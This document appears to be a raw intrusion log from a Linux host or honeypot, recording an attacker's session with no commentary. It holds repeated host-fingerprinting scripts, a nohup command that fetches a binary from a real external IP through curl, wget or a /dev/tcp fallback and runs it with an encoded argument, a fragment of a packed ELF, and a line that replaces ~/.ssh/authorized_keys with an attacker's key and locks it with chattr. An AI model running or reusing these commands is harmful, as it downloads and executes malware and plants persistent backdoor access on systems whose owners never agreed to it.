uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
hostname
echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://47.76.211.88:60131/linux -o /tmp/CUabv7u3LW; if [ ! -f /tmp/CUabv7u3LW ]; then wget http://47.76.211.88:60131/linux -O /tmp/CUabv7u3LW; fi; if [ ! -f /tmp/CUabv7u3LW ]; then exec 6<>/dev/tcp/47.76.211.88/60131 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/CUabv7u3LW ; chmod +x /tmp/CUabv7u3LW && /tmp/CUabv7u3LW CcEnzSjQo5ASMjEKiq/bPMwj0Hh4wSvUNNCkig00NxKVo9I8zCPQeXnBIs8yzK+VEjswEpWn2DDKItJ9aNAkyyjRr4oPOy0FnKzUNssj1GhwzyLONsynnQ8tMQiVrNQ2yyPVaHzWPcs327iXCC0yD5ys1DbLINRofNQ9wjLMp5cELTIOlKzUNssj2Wh51ybUNNChig06OxKWotM8zCPQeHnBJ80o0KWcEjY0Epaj1zzMI9B5fcEhyzbMp5ISMjUIiqfSN8Al0Xl80jPLN9C4khIxNBKWp9U8zCPQenzBJ80o1aCKDjIyEpyu2DDKItJ5aNk9yDTQuJUJOy0Fk6zUNssi1WhwzyHLMcyklRIyNAmeoNI3yirBcGbQJs8o06CKDjEzBpKm0zTMM9B4fM8hzj7Mp5IELTULnqDSN84rwXt5zyHINsyukhIyOgueoNI3yiDBfH/PIck+zKeTBS0yCJas1DbLItlofNY9wjTMoIoNNzoGkqbTMs0z0Hl5zyHIP8ynlA8tMQ2XrNQ2yyfRaHzWPcs00riRCS0wBZ6g0jfOIcF5edc9yzHauJYNOy0Ol6TYMMoi0X1o0CPOKNCinBIyNQSKoNU8zCPQfHDBIss+zKWVEjE3CIqn0D7AJdF5etczzyjQppISMTELiqXVPMwj0Hx8wSfNKNqvig4wMRKVrtc8zCPQe3nBIsk/zKeSDi0xD5a42z/AJdF5edczzjHMrpISMjQKiqTSP8Al0Xl70jPCP8ynlQstMg6XuNM1zynXeHnRJdoy1bicCi0xEpWi2zzMI9B6ev/VAtRgstPpqAkKlE1FUGYuETS3Z3M=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/CUabv7u3LW && /tmp/CUabv7u3LW CcEnzSjQo5ASMjEKiq/bPMwj0Hh4wSvUNNCkig00NxKVo9I8zCPQeXnBIs8yzK+VEjswEpWn2DDKItJ9aNAkyyjRr4oPOy0FnKzUNssj1GhwzyLONsynnQ8tMQiVrNQ2yyPVaHzWPcs327iXCC0yD5ys1DbLINRofNQ9wjLMp5cELTIOlKzUNssj2Wh51ybUNNChig06OxKWotM8zCPQeHnBJ80o0KWcEjY0Epaj1zzMI9B5fcEhyzbMp5ISMjUIiqfSN8Al0Xl80jPLN9C4khIxNBKWp9U8zCPQenzBJ80o1aCKDjIyEpyu2DDKItJ5aNk9yDTQuJUJOy0Fk6zUNssi1WhwzyHLMcyklRIyNAmeoNI3yirBcGbQJs8o06CKDjEzBpKm0zTMM9B4fM8hzj7Mp5IELTULnqDSN84rwXt5zyHINsyukhIyOgueoNI3yiDBfH/PIck+zKeTBS0yCJas1DbLItlofNY9wjTMoIoNNzoGkqbTMs0z0Hl5zyHIP8ynlA8tMQ2XrNQ2yyfRaHzWPcs00riRCS0wBZ6g0jfOIcF5edc9yzHauJYNOy0Ol6TYMMoi0X1o0CPOKNCinBIyNQSKoNU8zCPQfHDBIss+zKWVEjE3CIqn0D7AJdF5etczzyjQppISMTELiqXVPMwj0Hx8wSfNKNqvig4wMRKVrtc8zCPQe3nBIsk/zKeSDi0xD5a42z/AJdF5edczzjHMrpISMjQKiqTSP8Al0Xl70jPCP8ynlQstMg6XuNM1zynXeHnRJdoy1bicCi0xEpWi2zzMI9B6ev/VAtRgstPpqAkKlE1FUGYuETS3Z3M=" &
head -c 3800636 > /tmp/H5l3MQPLnF
nohup $SHELL -c "curl http://47.76.211.88:60131/linux -o /tmp/CUabv7u3LW; if [ ! -f /tmp/CUabv7u3LW ]; then wget http://47.76.211.88:60131/linux -O /tmp/CUabv7u3LW; fi; if [ ! -f /tmp/CUabv7u3LW ]; then exec 6<>/dev/tcp/47.76.211.88/60131 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/CUabv7u3LW ; chmod +x /tmp/CUabv7u3LW && /tmp/CUabv7u3LW CcEnzSjQo5ASMjEKiq/bPMwj0Hh4wSvUNNCkig00NxKVo9I8zCPQeXnBIs8yzK+VEjswEpWn2DDKItJ9aNAkyyjRr4oPOy0FnKzUNssj1GhwzyLONsynnQ8tMQiVrNQ2yyPVaHzWPcs327iXCC0yD5ys1DbLINRofNQ9wjLMp5cELTIOlKzUNssj2Wh51ybUNNChig06OxKWotM8zCPQeHnBJ80o0KWcEjY0Epaj1zzMI9B5fcEhyzbMp5ISMjUIiqfSN8Al0Xl80jPLN9C4khIxNBKWp9U8zCPQenzBJ80o1aCKDjIyEpyu2DDKItJ5aNk9yDTQuJUJOy0Fk6zUNssi1WhwzyHLMcyklRIyNAmeoNI3yirBcGbQJs8o06CKDjEzBpKm0zTMM9B4fM8hzj7Mp5IELTULnqDSN84rwXt5zyHINsyukhIyOgueoNI3yiDBfH/PIck+zKeTBS0yCJas1DbLItlofNY9wjTMoIoNNzoGkqbTMs0z0Hl5zyHIP8ynlA8tMQ2XrNQ2yyfRaHzWPcs00riRCS0wBZ6g0jfOIcF5edc9yzHauJYNOy0Ol6TYMMoi0X1o0CPOKNCinBIyNQSKoNU8zCPQfHDBIss+zKWVEjE3CIqn0D7AJdF5etczzyjQppISMTELiqXVPMwj0Hx8wSfNKNqvig4wMRKVrtc8zCPQe3nBIsk/zKeSDi0xD5a42z/AJdF5edczzjHMrpISMjQKiqTSP8Al0Xl70jPCP8ynlQstMg6XuNM1zynXeHnRJdoy1bicCi0xEpWi2zzMI9B6ev/VAtRgstPpqAkKlE1FUGYuETS3Z3M=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/CUabv7u3LW && /tmp/CUabv7u3LW CcEnzSjQo5ASMjEKiq/bPMwj0Hh4wSvUNNCkig00NxKVo9I8zCPQeXnBIs8yzK+VEjswEpWn2DDKItJ9aNAkyyjRr4oPOy0FnKzUNssj1GhwzyLONsynnQ8tMQiVrNQ2yyPVaHzWPcs327iXCC0yD5ys1DbLINRofNQ9wjLMp5cELTIOlKzUNssj2Wh51ybUNNChig06OxKWotM8zCPQeHnBJ80o0KWcEjY0Epaj1zzMI9B5fcEhyzbMp5ISMjUIiqfSN8Al0Xl80jPLN9C4khIxNBKWp9U8zCPQenzBJ80o1aCKDjIyEpyu2DDKItJ5aNk9yDTQuJUJOy0Fk6zUNssi1WhwzyHLMcyklRIyNAmeoNI3yirBcGbQJs8o06CKDjEzBpKm0zTMM9B4fM8hzj7Mp5IELTULnqDSN84rwXt5zyHINsyukhIyOgueoNI3yiDBfH/PIck+zKeTBS0yCJas1DbLItlofNY9wjTMoIoNNzoGkqbTMs0z0Hl5zyHIP8ynlA8tMQ2XrNQ2yyfRaHzWPcs00riRCS0wBZ6g0jfOIcF5edc9yzHauJYNOy0Ol6TYMMoi0X1o0CPOKNCinBIyNQSKoNU8zCPQfHDBIss+zKWVEjE3CIqn0D7AJdF5etczzyjQppISMTELiqXVPMwj0Hx8wSfNKNqvig4wMRKVrtc8zCPQe3nBIsk/zKeSDi0xD5a42z/AJdF5edczzjHMrpISMjQKiqTSP8Al0Xl70jPCP8ynlQstMg6XuNM1zynXeHnRJdoy1bicCi0xEpWi2zzMI9B6ev/VAtRgstPpqAkKlE1FUGYuETS3Z3M=" &#UPX!
>A@/1'8ELF7}
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
hostname
whoami
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
netstat -tulpn | head -10
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
